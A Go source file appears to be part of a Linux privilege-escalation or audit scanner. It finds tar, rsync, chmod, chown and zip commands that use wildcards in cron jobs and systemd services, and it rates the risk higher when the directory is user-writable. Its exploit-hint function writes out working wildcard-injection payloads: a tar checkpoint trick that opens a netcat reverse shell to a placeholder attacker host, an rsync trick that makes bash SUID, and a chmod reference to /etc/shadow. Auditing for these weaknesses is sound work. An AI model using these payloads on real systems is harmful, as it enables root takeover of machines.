package scanners

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
)

// WildcardResult represents a detected wildcard injection vulnerability.
type WildcardResult struct {
	SourceFile    string `json:"source_file"`           // Cron file, systemd service, or script path
	ScriptPath    string `json:"script_path,omitempty"` // Target script being executed
	Command       string `json:"command"`               // Exact command line with wildcard
	VulnerableCmd string `json:"vulnerable_cmd"`       // tar, rsync, chown, chmod, 7z, zip
	WorkingDir    string `json:"working_dir"`           // Working directory of command / script
	RiskLevel     string `json:"risk_level"`            // CRITICAL, HIGH, MEDIUM
	IsWritableDir bool   `json:"is_writable_dir"`       // Whether current user can plant files in working dir
	Reason        string `json:"reason"`
	ExploitHint   string `json:"exploit_hint"`
	Remediation   string `json:"remediation,omitempty"`
	ComplianceTag string `json:"compliance_tag,omitempty"`
	IsDangerous   bool   `json:"is_dangerous"`
}

var vulnerableWildcardCmds = []string{"tar", "rsync", "chmod", "chown", "7z", "zip"}

var reCdDir = regexp.MustCompile(`(?m)^\s*cd\s+([^\s;&|]+)`)

// ScanWildcardInjections audits cron files and systemd service scripts for wildcard injection vulnerabilities.
func ScanWildcardInjections() ([]WildcardResult, error) {
	var results []WildcardResult
	userCtx := GetUserContext()
	seen := make(map[string]bool)

	// 1. Audit Crontabs and Cron drop-in directories
	cronDirs := []string{
		"/etc/crontab",
		"/etc/cron.d",
		"/etc/cron.daily",
		"/etc/cron.hourly",
		"/etc/cron.weekly",
		"/etc/cron.monthly",
		"/var/spool/cron",
		"/var/spool/cron/crontabs",
	}

	for _, target := range cronDirs {
		info, err := os.Stat(target)
		if err != nil {
			continue
		}

		if info.IsDir() {
			entries, err := os.ReadDir(target)
			if err != nil {
				continue
			}
			for _, entry := range entries {
				if entry.IsDir() || strings.HasPrefix(entry.Name(), ".") {
					continue
				}
				filePath := filepath.Join(target, entry.Name())
				inspectCronOrScriptFile(filePath, userCtx, &results, seen)
			}
		} else {
			inspectCronOrScriptFile(target, userCtx, &results, seen)
		}
	}

	// 2. Audit Systemd Service unit ExecStart scripts
	serviceDirs := []string{
		"/etc/systemd/system",
		"/lib/systemd/system",
		"/usr/lib/systemd/system",
	}

	for _, sDir := range serviceDirs {
		entries, err := os.ReadDir(sDir)
		if err != nil {
			continue
		}
		for _, entry := range entries {
			if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".service") {
				continue
			}
			sFile := filepath.Join(sDir, entry.Name())
			inspectServiceFile(sFile, userCtx, &results, seen)
		}
	}

	return results, nil
}

func inspectCronOrScriptFile(filePath string, userCtx *UserContext, results *[]WildcardResult, seen map[string]bool) {
	file, err := os.Open(filePath)
	if err != nil {
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "#") || line == "" {
			continue
		}

		// Extract command from crontab line
		fields := strings.Fields(line)
		if len(fields) >= 6 {
			var cmd string
			// /etc/crontab and /etc/cron.d/* specify a user (e.g. root) at field 6 (index 5)
			if len(fields) >= 7 && isSystemCron(filePath) {
				cmd = strings.Join(fields[6:], " ")
			} else {
				cmd = strings.Join(fields[5:], " ")
			}

			checkCommandForWildcard(filePath, cmd, "", userCtx, results, seen)
		}
	}
}

func inspectServiceFile(serviceFile string, userCtx *UserContext, results *[]WildcardResult, seen map[string]bool) {
	file, err := os.Open(serviceFile)
	if err != nil {
		return
	}
	defer file.Close()

	var workingDir string
	var execCommands []string

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "WorkingDirectory=") {
			workingDir = strings.TrimPrefix(line, "WorkingDirectory=")
		} else if strings.HasPrefix(line, "ExecStart=") {
			execCommands = append(execCommands, strings.TrimPrefix(line, "ExecStart="))
		}
	}

	for _, cmd := range execCommands {
		checkCommandForWildcard(serviceFile, cmd, workingDir, userCtx, results, seen)
	}
}

func isSystemCron(path string) bool {
	return strings.HasPrefix(path, "/etc/cron.d") || path == "/etc/crontab"
}

// checkCommandForWildcard analyzes a command line or references to shell scripts.
func checkCommandForWildcard(sourceFile, cmd, specifiedWorkingDir string, userCtx *UserContext, results *[]WildcardResult, seen map[string]bool) {
	// First check: does the command itself have a vulnerable wildcard call?
	for _, vCmd := range vulnerableWildcardCmds {
		if hasWildcardCall(cmd, vCmd) {
			evalDir := determineWorkingDir(cmd, specifiedWorkingDir, sourceFile)
			reportWildcard(sourceFile, "", cmd, vCmd, evalDir, userCtx, results, seen)
			return
		}
	}

	// Second check: does the command execute a shell script that contains wildcards?
	scriptPath := extractScriptPath(cmd)
	if scriptPath != "" {
		inspectScriptContent(sourceFile, scriptPath, specifiedWorkingDir, userCtx, results, seen)
	}
}

// extractScriptPath extracts the path of a script from an invocation like `bash /path/to/script.sh` or `/opt/backup.sh`.
func extractScriptPath(cmd string) string {
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return ""
	}

	first := parts[0]
	// Handle leading modifiers like '-' or '+'
	first = strings.TrimPrefix(first, "-")
	first = strings.TrimPrefix(first, "+")

	interpreters := map[string]bool{
		"bash": true, "sh": true, "dash": true, "zsh": true,
	}

	base := filepath.Base(first)
	if interpreters[base] && len(parts) > 1 {
		for _, arg := range parts[1:] {
			if !strings.HasPrefix(arg, "-") && (strings.HasSuffix(arg, ".sh") || strings.HasPrefix(arg, "/")) {
				return arg
			}
		}
	} else if strings.HasPrefix(first, "/") && (strings.HasSuffix(first, ".sh") || isExecutableScript(first)) {
		return first
	}

	return ""
}

func isExecutableScript(path string) bool {
	info, err := os.Stat(path)
	if err != nil || info.IsDir() {
		return false
	}
	return info.Mode().Perm()&0111 != 0
}

func inspectScriptContent(sourceFile, scriptPath, specifiedWorkingDir string, userCtx *UserContext, results *[]WildcardResult, seen map[string]bool) {
	file, err := os.Open(scriptPath)
	if err != nil {
		return
	}
	defer file.Close()

	// Limit script inspection to 64KB to avoid memory bloat
	reader := io.LimitReader(file, 64*1024)
	scanner := bufio.NewScanner(reader)

	currentWorkingDir := specifiedWorkingDir
	if currentWorkingDir == "" {
		currentWorkingDir = filepath.Dir(scriptPath)
	}

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "#") || line == "" {
			continue
		}

		// Track cd directory changes within the script
		if cdMatch := reCdDir.FindStringSubmatch(line); len(cdMatch) > 1 {
			targetDir := strings.Trim(cdMatch[1], `"'`)
			if filepath.IsAbs(targetDir) {
				currentWorkingDir = targetDir
			} else {
				currentWorkingDir = filepath.Clean(filepath.Join(currentWorkingDir, targetDir))
			}
		}

		for _, vCmd := range vulnerableWildcardCmds {
			if hasWildcardCall(line, vCmd) {
				reportWildcard(sourceFile, scriptPath, line, vCmd, currentWorkingDir, userCtx, results, seen)
			}
		}
	}
}

func hasWildcardCall(line, vCmd string) bool {
	// Look for command followed by space/flags and an unquoted '*'
	pattern := fmt.Sprintf(`(?:^|[;&|]\s*)%s(?:\s+-[^\s]+)*\s+.*\*`, regexp.QuoteMeta(vCmd))
	matched, _ := regexp.MatchString(pattern, line)
	return matched
}

func determineWorkingDir(cmd, specifiedWorkingDir, sourceFile string) string {
	if specifiedWorkingDir != "" {
		return specifiedWorkingDir
	}
	if cdMatch := reCdDir.FindStringSubmatch(cmd); len(cdMatch) > 1 {
		targetDir := strings.Trim(cdMatch[1], `"'`)
		if filepath.IsAbs(targetDir) {
			return targetDir
		}
	}
	// Fallback to source file directory or /tmp
	if filepath.IsAbs(sourceFile) {
		return filepath.Dir(sourceFile)
	}
	return "/tmp"
}

func reportWildcard(sourceFile, scriptPath, cmd, vCmd, workingDir string, userCtx *UserContext, results *[]WildcardResult, seen map[string]bool) {
	dedup := fmt.Sprintf("%s|%s|%s|%s", sourceFile, scriptPath, vCmd, cmd)
	if seen[dedup] {
		return
	}
	seen[dedup] = true

	isWritable := false
	if userCtx != nil && workingDir != "" {
		if info, err := os.Stat(workingDir); err == nil {
			if stat, ok := info.Sys().(*syscall.Stat_t); ok {
				isWritable = userCtx.CanWrite(int(stat.Uid), int(stat.Gid), stat.Mode)
			}
		}
	}

	riskLevel := "HIGH"
	if isWritable {
		riskLevel = "CRITICAL"
	}

	exploitHint := generateExploitHint(vCmd, workingDir)
	reason := fmt.Sprintf("Executed '%s' with wildcard (*) expansion", vCmd)
	if isWritable {
		reason = fmt.Sprintf("Executed '%s' with wildcard (*) inside user-writable directory '%s' (Privilege Escalation via argument injection)", vCmd, workingDir)
	}

	*results = append(*results, WildcardResult{
		SourceFile:    sourceFile,
		ScriptPath:    scriptPath,
		Command:       cmd,
		VulnerableCmd: vCmd,
		WorkingDir:    workingDir,
		RiskLevel:     riskLevel,
		IsWritableDir: isWritable,
		Reason:        reason,
		ExploitHint:   exploitHint,
		Remediation:   fmt.Sprintf("Replace wildcard arguments in %s with explicit file paths or avoid passing '*' directly to %s", sourceFile, vCmd),
		ComplianceTag: "CIS-Linux-5.1.2 / NIST-AC-6",
		IsDangerous:   true,
	})
}

func generateExploitHint(vCmd, workingDir string) string {
	switch vCmd {
	case "tar":
		return fmt.Sprintf("In %s: echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker> <port> >/tmp/f' > shell.sh && chmod +x shell.sh && touch -- '--checkpoint=1' && touch -- '--checkpoint-action=exec=sh shell.sh'", workingDir)
	case "rsync":
		return fmt.Sprintf("In %s: echo 'chmod u+s /bin/bash' > shell.sh && chmod +x shell.sh && touch -- '-e sh shell.sh'", workingDir)
	case "chmod":
		return fmt.Sprintf("In %s: touch -- '--reference=/etc/shadow' (will copy permissions from reference file to all matched files)", workingDir)
	case "chown":
		return fmt.Sprintf("In %s: touch -- '--reference=/tmp/my_file' (will set owner to match reference file across all targets)", workingDir)
	case "7z", "zip":
		return fmt.Sprintf("In %s: Plant malicious symlinks or injection parameter files matching archive flags before root execution", workingDir)
	default:
		return fmt.Sprintf("Create files matching command-line switches in %s to inject arbitrary parameters into %s", workingDir, vCmd)
	}
}
